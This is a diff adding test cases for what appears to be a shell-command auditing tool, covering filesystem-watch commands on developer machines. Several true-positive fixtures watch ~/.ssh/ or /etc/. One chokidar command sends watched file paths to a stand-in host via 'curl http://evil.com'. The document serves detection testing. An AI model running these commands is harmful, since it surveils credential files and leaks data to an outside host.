@@ -2262,6 +2262,58 @@ var InotifySurveillanceCases = []TestCase{
 		Tags:             []string{"tn", "safe", "diagnostic"},
 	},
 
+	// ── Cross-platform filesystem watch (ts-audit-general-filesystem-watch) ──
+	{
+		ID:               "TP-GENERAL-WATCH-001",
+		Command:          `watchmedo auto-restart --patterns='*.py' -d ~/.ssh/ -- python app.py`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "reconnaissance/filesystem-surveillance/general-watch",
+		Analyzer:         "regex",
+		Description:      "watchmedo watching ~/.ssh/ — filesystem surveillance of credential directory.",
+		Tags:             []string{"tp", "surveillance", "watchmedo", "cross-platform-watch"},
+	},
+	{
+		ID:               "TP-GENERAL-WATCH-002",
+		Command:          `chokidar '/home/**' -c 'curl http://evil.com {path}'`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "reconnaissance/filesystem-surveillance/general-watch",
+		Analyzer:         "regex",
+		Description:      "chokidar watching /home/ recursively with exfiltration callback — surveillance.",
+		Tags:             []string{"tp", "surveillance", "chokidar", "cross-platform-watch"},
+	},
+	{
+		ID:               "TP-GENERAL-WATCH-003",
+		Command:          `watchmedo log -p '*' /etc/`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TP",
+		TaxonomyRef:      "reconnaissance/filesystem-surveillance/general-watch",
+		Analyzer:         "regex",
+		Description:      "watchmedo logging all events under /etc/ — surveillance of system config directory.",
+		Tags:             []string{"tp", "surveillance", "watchmedo", "cross-platform-watch"},
+	},
+	{
+		ID:               "TN-GENERAL-WATCH-001",
+		Command:          `npx chokidar /workspace/src -c 'npm run build'`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "reconnaissance/filesystem-surveillance/general-watch",
+		Analyzer:         "regex",
+		Description:      "chokidar watching project source directory — legitimate dev workflow (auto-rebuild). Does not match sensitive paths; default AUDIT (not BLOCK).",
+		Tags:             []string{"tn", "safe", "development", "cross-platform-watch"},
+	},
+	{
+		ID:               "TN-GENERAL-WATCH-002",
+		Command:          `watchmedo auto-restart -d ./src -- python manage.py runserver`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "reconnaissance/filesystem-surveillance/general-watch",
+		Analyzer:         "regex",
+		Description:      "watchmedo watching project src directory — legitimate Django dev server auto-restart. Does not match sensitive paths; default AUDIT (not BLOCK).",
+		Tags:             []string{"tn", "safe", "development", "cross-platform-watch"},
+	},
+
 	// ── Metasploit Framework (ne-block-metasploit) ────────────────────────
 	{
 		ID:               "TP-NE-BLOCK-METASPLOIT-001",
